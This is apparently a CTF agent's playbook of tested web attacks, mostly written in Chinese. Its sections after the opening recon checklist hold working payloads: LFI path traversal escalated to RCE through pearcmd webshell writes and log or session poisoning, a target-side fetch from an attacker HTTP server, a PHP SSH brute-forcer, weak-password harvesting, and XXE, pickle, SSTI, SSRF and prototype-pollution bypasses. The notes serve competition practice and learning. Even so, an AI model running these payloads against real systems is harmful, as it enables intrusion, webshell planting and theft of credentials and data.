# Web, API, And Runtime

Use this reference for web challenges, API challenges, SSR/frontend issues, queue-backed app flows, or any case where browser state and request order matter.

## Default Ladder

1. Inspect entry HTML, boot scripts, route registration, hydration data, and runtime config.
2. Inspect browser persistence: cookies, localStorage, sessionStorage, IndexedDB, Cache Storage, service workers, and transient globals.
3. Capture the real request order before theorizing from source.
4. Map backend entrypoints, middleware order, handlers, workers, retries, and downstream state changes.
5. Re-run the smallest flow with one variable changed.

## High-Value Targets

- Hidden routes, debug pages, preview modes, experiment toggles, alternate hostnames
- Auth and session flow: minting, refresh, header injection, role derivation, cookie scope
- Upload, import, export, template, archive, and deserialization boundaries
- Background jobs, queues, cron tasks, and event consumers
- Host-header handling, base-URL derivation, proxy headers, path-prefix routing

## Evidence To Keep

- Exact requests: host, path, query, headers, cookies, and body
- Exact responses or failures that reveal parser behavior or hidden branches
- Storage keys, feature flags, worker names, and queue payloads
- Concrete file paths, function names, route names, or runtime hook points

## Common Pitfalls

- Treating UI gating as backend enforcement
- Trusting checked-in source over actively served assets
- Missing the real request order because only the visible UI was inspected
- Ignoring container/proxy routing inputs such as `Host` or forwarded headers

---

# LFI → RCE 武器库（2026-07-31 TSec b-01 实测沉淀，33 分钟破题）

> 场景：`services.php?lang=` 参数 LFI，最后 pearcmd 拿到 RCE。以下按实战顺序，先探测后升级。

## 1. LFI 探测（30 秒内确认）

```bash
# 双编码与大小写穿透（PHP 会做一轮 decode，必须叠两层 ..）
curl -sS -G "http://TGT/services.php" --data-urlencode "lang=....//....//....//....//etc/passwd"
# 普通路径（先试无绕过）
curl -sS -G "http://TGT/page.php" --data-urlencode "file=../../../etc/passwd"
# 判据：响应里出现 root:x:0:0: 或长度突变（对比正常参数响应长度）
```

关键：**拿到 LFI 第一件事是读自身源码**（`services.php` 本身），搞清过滤逻辑再想绕过，比盲试 payload 快一个量级。

## 2. 读敏感文件优先级（按信息价值排序）

```bash
# ① 应用自身源码（过滤逻辑、可写路径、隐藏功能）
lang=....//....//....//....//var/www/html/services.php
# ② Web 服务器配置（站点路径、alias、proxy 后端）
lang=....//....//....//....//etc/nginx/sites-enabled/default
lang=....//....//....//....//etc/nginx/nginx.conf
# ③ PHP 配置（disable_functions、allow_url_include、session.save_path）
lang=....//....//....//....//usr/local/etc/php/php.ini
# ④ 日志（投毒候选：access.log / error.log 路径）
lang=....//....//....//....//var/log/nginx/access.log
```

## 3. RCE 升级阶梯（按成功率排序）

### 3a. pearcmd.php（推荐首选，LFI 直通 RCE）

利用 PHP 发行版自带 PEAR 的 `config-create` 参数写文件。**版本路径必须先探测**：

```bash
# 探测 pearcmd 路径（多版本）
for p in \
  /usr/local/lib/php/pearcmd.php /usr/share/php/pearcmd.php \
  /usr/lib/php/pearcmd.php /usr/share/pear/pearcmd.php; do
  echo "== $p =="; curl -sS -G "http://TGT/services.php" \
    --data-urlencode "lang=....//....//....//....//$p" -o /tmp/o -w "%{size_download}\n"
done

# 命中后（size 明显变大）用 config-create 写 shell：
# 原理：config-create <shell内容> <目标路径>，且 register_argc_argv=On 时可从 query 控制
curl -sS -m 15 "http://TGT/services.php?lang=....//....//....//....//usr/local/lib/php/pearcmd.php&+config-create+/&file=/tmp/s.php&/<?=eval(\$_POST[1])?>+/tmp/pwn.php"
# 之后访问 /tmp 下或 web 目录下 pwn.php 验证
```

### 3b. 日志投毒（无 pearcmd 时）

```bash
# ① 先确认日志可读且路径已知
lang=....//....//....//....//var/log/nginx/access.log
# ② 用 curl UA 注入 PHP 代码（%3C%3Fphp 必须 URL 编码）
curl -sS -A '<?php system($_GET["c"]); ?>' "http://TGT/"
# ③ 再包含日志 + 触发
curl -sS -G "http://TGT/services.php" --data-urlencode "lang=....//....//....//....//var/log/nginx/access.log" --data-urlencode "c=id"
```

### 3c. session 投毒（日志不可写时）

```bash
# 先确认 session.save_path（php.ini 里读），默认 /var/lib/php/sessions
# 用恶意 PHPSESSID 值写 session 文件，再包含
curl -sS -b "PHPSESSID=<?php system(\$_GET['c']); ?>" "http://TGT/"
curl -sS -G "http://TGT/services.php" --data-urlencode "lang=....//....//....//....//var/lib/php/sessions/sess_<?php system(\$_GET['c']); ?>" --data-urlencode "c=id"
```

### 3d. php://filter 组合链（读不了源码时兜底）

```bash
# base64 编码读源码（防解释执行）
lang=php://filter/convert.base64-encode/resource=services.php
# 组合过滤器绕过（大小写/rot13 等）
lang=php://filter/convert.base64-encode|convert.iconv.UTF-8.UTF-7/resource=services.php
```

## 4. RCE 落地与交互（拿 webshell 后的标准动作）

```bash
# 定义交互函数，之后所有命令走它
rce() { curl -sS -m 30 -G "http://TGT/s.php" --data-urlencode "c=$1"; echo; }
rce 'id; uname -a; hostname; pwd'
rce 'ls -la /var/www/html; find / -name "*flag*" -o -name "flag*" 2>/dev/null | head'
# flag 到手立即提交平台，不要攒！
```

---

# RCE 后工具投递链（2026-07-31 实测沉淀）

目标机常是精简镜像（无 python3、无 wget、无 curl 全家桶），先把工具喂进去再打横向。

## 1. 解释器/工具探测（先探后用，别假设）

```bash
rce 'for c in python3 python php perl busybox wget curl nc xxd base64; do command -v $c 2>/dev/null; done'
# 实测 b-03 无 python3：sh: python3: not found —— 别硬用 python 链
```

## 2. 攻击机自建 HTTP server（文件中转）

```bash
# 攻击机（kali）上：绑 VPN 内网 IP，别绑 localhost
cd /path/to/http_serve && python3 -m http.server 18888 --bind 10.254.0.51 &
# 目标机验证回连：rce 'curl -sS -m 8 http://10.254.0.51:18888/busybox -o /tmp/busybox'
```

## 3. 静态二进制清单（打横向/爆破用）

| 工具 | 用途 | 投递方式 |
|------|------|----------|
| busybox | 万能瑞士军刀（nc/xxd/wget 缺失时的替代） | wget/php copy 到 /tmp |
| phpseclib | **PHP 里跑 SSH 爆破**（目标只有 PHP 时） | 打包成 /tmp/lib 目录 + autoload |
| dropbear/dbclient 静态版 | 目标机做 SSH 客户端/隧道 | 交叉编译 musl 静态，单文件 |
| nmap 静态版 | 目标机侧端口扫描 | busybox nc 循环替代也可 |

```bash
# PHP 版 SSH 爆破骨架（phpseclib，目标无 python 时唯一选择）
rce 'cat > /tmp/sshbrute.php <<'"'"'EOF'"'"'
<?php
require_once "/tmp/lib/phpseclib/bootstrap.php";
use phpseclib3\Net\SSH2;
$h=$argv[1]; $u=$argv[2]; $p=$argv[3];
$s=new SSH2($h); if($s->login($u,$p)){echo "SUCCESS $u:$p\n";}
?>
EOF'
```

## 4. 弱口令字典工程（从源码挖业务词，别硬撞通用表）

```bash
# ① 全站源码 dump 后 grep 凭证线索
rg -n "password|passwd|secret|admin|弱口令|TODO|FIXME|key|ssh" web_dump.txt | head -100
# ② 业务词构造：公司名/产品名 + 年份 + 特殊符号
# 实测命中：admin/1qaz@WSX（键盘序列）、editor/Admin123、天盾@2024/天盾@2026
# ③ MD5 撞库：hashcat -m 0 或先查在线库（92d7ddd2... 命中 1qaz@WSX）
```

---

# exec 执行环境契约（37 次失败复盘，2026-07-31）

> 以下坑位 7-31 测试踩了 37 次 failed 调用的大头，全是环境契约问题，不是攻击思路问题。记住能直接省 10% 调用。

## 1. executor 是 sh 不是 bash

`sh: 6: Bad substitution` —— 脚本里写了 `${var//}` 等 bash 特有语法，executor 用 sh 解析会炸。

```bash
# ✅ 正确：POSIX 兼容语法
for p in a b c; do echo "$p"; done
# ❌ 错误：bash 数组/参数替换
arr=(a b c); echo "${arr[@]}"
```

## 2. 单引号 heredoc 不展开 shell 变量

`python3 << 'PY'` 里用 `$WORKDIR` 会原样传给 python（`NameError: name 'WORKDIR' is not defined`）。

```bash
# ✅ 正确：环境变量传递（python 读 os.environ）
WORKDIR=/path python3 << 'PY'
import os
print(os.environ['WORKDIR'])
PY
# 或双引号 heredoc（注意 $ 转义）
python3 << PY
print("$WORKDIR")
PY
```

## 3. 300s 无输出超时（长任务被杀）

`shell inactivity timeout (300s)` —— 编译/大文件 LFI dump/爆破静默超 300s 被框架杀。

```bash
# ✅ 正确：后台化 + 输出重定向 + 轮询
nohup python3 -m http.server 18888 >/tmp/http.log 2>&1 &
nohup bash big_job.sh >/tmp/job.log 2>&1 &
# 轮询结果，而不是前台死等
sleep 20; tail -20 /tmp/job.log
# 或调大 agent.shell_no_output_timeout_seconds（-1=关闭）
```

## 4. 目标机解释器缺失

RCE 后目标机可能没 python3（实测 b-03：`sh: python3: not found`）。先探测再选型：
- 有 PHP → php -r 做一切
- 有 busybox → wget/nc/xxd 替代
- 只有 sh → 纯 shell 脚本（别用函数语法，目标机可能也是 sh）

## 5. 目标机 shell 方言

传过去的脚本报 `sh: Syntax error: "(" unexpected` = 目标机是 sh/dash，函数 `foo() {}` 语法兼容但数组等不兼容。**目标机脚本一律按 POSIX sh 写。**

---

# WAF 绕过武器库（2026-08-03 TSec 15 题实测沉淀）

> 本场 15 题全部是"WAF/过滤 + 绕过"型 Web 题，以下每条都有实测 POC 与响应特征。

## 1. 文件上传 WAF 绕过 → RCE（a-04 实测）

```bash
# 场景：/api/upload.php 拦截 .php 后缀。用 .htaccess + AddType 把任意后缀当 PHP 执行
# ① 先上传 .htaccess（若未被拦）
AddType application/x-httpd-php .jpeg
# ② 再上传 shell.jpeg 内容为 PHP 代码
rce: curl -sS "http://TGT/uploads/shell.jpeg?c=id"
# 响应特征：图片后缀但返回 PHP 执行结果
```

## 2. XXE UTF-16LE 编码绕过 WAF（a-07 实测）

```bash
# 场景：/api.php?endpoint=import 的 XML 解析，WAF 按字节拦 <!DOCTYPE 等关键字
# 绕过：整段 XML 用 UTF-16LE 编码，WAF 关键字匹配失效，解析器照常处理
python3 -c "
xml = '''<?xml version=\"1.0\" encoding=\"UTF-16\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///challenge/flag.txt\">]>
<root>&xxe;</root>'''
open('p.xml','wb').write(xml.encode('utf-16-le'))
"
curl -sS -X POST "http://TGT/api.php?endpoint=import" --data-binary @p.xml -H 'Content-Type: application/xml'
# 响应特征：解析结果（JSON）里某个字段回显文件内容
```

## 3. 代码执行黑名单绕过：chr() 拼接（a-12 实测）

```bash
# 场景：/api/execute 过滤 _ [ ] 及 eval/exec/open/import/file/compile/commands/subprocess 子串
# 绕过：用 chr() 拼出被禁字符串
payload = "print(open('/challenge/flag.txt').read())"
# 用 chr(95) 拼下划线、chr(91)/chr(93) 拼中括号，配合 getattr 链
# 响应特征：直接返回命令输出
```

## 4. 原型链污染（a-13 实测）

```bash
# 场景：/admin 接收 JSON key/value 用 pydash.set_ 写入，过滤 '_.' 开头
# 绕过：用反斜杠转义（'__class__\\.__init__\\.__globals__\\.__file__'）绕过 '_.' 前缀过滤
curl -sS -X POST "http://TGT/admin" -H 'Content-Type: application/json' \
  -d '{"key":"__class__\\.__init__\\.__globals__\\.__file__","value":"/etc/passwd"}'
# 响应特征：后续模块读取 globals 时返回被覆盖值
```

## 5. 绝对路径 LFI 绕过 WAF（a-01/a-06 实测）

```bash
# 场景：WAF 只过滤 ../，但允许绝对路径
curl -sS -X POST "http://TGT/api/logs/read" -d 'filename=/challenge/flag.txt'
curl -sS "http://TGT/preview?file=/challenge/flag.txt"
# 响应特征：直接返回文件内容（flag 明文）
```

## 6. pickle cookie 反序列化 RCE（a-02 实测）

```bash
# 场景：/preferences 用 pref_<username> cookie 存 pickle 序列化数据
# 构造恶意 pickle：__reduce__ 执行 eval
python3 -c "
import pickle, os
class P:
    def __reduce__(self):
        return (eval, ('__import__(\"os\").popen(\"cat /challenge/flag.txt\").read()',))
print(pickle.dumps(P()).hex())
"
curl -sS -b "pref_<username>=<hex>" "http://TGT/preferences"
# 响应特征：页面回显命令输出
```

## 7. SSRF → 命令注入链（a-14 实测）

```bash
# 场景：/api/import 的 target_endpoint 字段可 SSRF 访问内网 admin-api；admin-api 的 archive filename 参数命令注入
# ① 先找内网管理端点（源码/文档提示）
# ② SSRF 打到 admin-api 的 archive 接口，filename 注入命令
curl -sS -X POST "http://TGT/api/import" -H 'Content-Type: application/json' \
  -d '{"target_endpoint":"http://127.0.0.1:8000/admin-api/archive","filename":"x;cat /challenge/flag.txt;echo"}'
# 响应特征：命令结果出现在回显
```

## 8. SQLi 读管理员明文 → SSTI 链（a-11 实测）

```bash
# ① /dashboard?search_query= 布尔/UNION 注入读出 admin 明文密码
# ② 登录 /admin → 模板参数注入 Jinja2 SSTI
{{ config.__class__.__init__.__globals__['os'].popen('cat /challenge/flag.txt').read() }}
# 响应特征：模板渲染输出命令结果
```

## 9. PHP 反序列化 POP 链（a-15 实测）

```bash
# 场景：/upload.php 上传 .tpl 文件内容被 unserialize() 处理
# 构造 POP 链：TemplateMetadata → ReportRenderer → ExportPostProcessor → 任意文件写/命令执行
# 需要先读应用源码确认类名与魔术方法链（__wakeup/__destruct）
# 响应特征：上传后访问触发链的页面得到 RCE 结果
```

## 10. 业务逻辑：价格/余额校验缺失（a-10 实测）

```bash
# 场景：/purchase 只校验前端传来的价格/优惠券，服务端不重新核算
# 用大额优惠券直接买高价值商品
curl -sS -X POST "http://TGT/purchase" -d 'product_id=<flag商品>&coupon=33'
# 响应特征：购买成功，返回 flag
```

## 11. 未授权敏感文件下载（a-17 实测）

```bash
# 场景：/db/sysdiag.db 未授权可下载 SQLite 数据库，配置表含 flag
curl -sS "http://TGT/db/sysdiag.db" -o sysdiag.db
sqlite3 sysdiag.db "SELECT * FROM config;"
# 响应特征：直接拿到 system_flag
```

---

# 后台任务状态契约（2026-08-03 5 小时黑洞教训）

> 8-03 场 19:07-21:10 死等一个已结束的后台任务（228 次 wait 失败），浪费 2 小时。以下规则防止重蹈覆辙。

## 1. wait_tool_execution 失败即止损

- 同一 execution_id 连续 wait 失败 2 次 → 判定任务已死，**停止等待**
- 改用 curl/文件探测直接验证结果，禁止反复 wait 同一 ID

## 2. 后台任务必须带终态信号

```bash
# ✅ 正确：任务完成写标记文件
nohup bash -c 'do_work; echo DONE > /tmp/job.done' >/tmp/job.log 2>&1 &
# 轮询：看标记文件而非 wait
ls /tmp/job.done 2>/dev/null && echo "完成" || tail -3 /tmp/job.log
# 连续 3 次轮询无新内容 → 判定卡死，前台小步重验
```

## 3. 网络探测不是攻击

- curl 失败 ≠ 目标下线：最多重试 2 次，仍失败记录后切其他目标
- 禁止 sleep 空转轮询；一切等待 ≤60s 上限，超限转主动验证
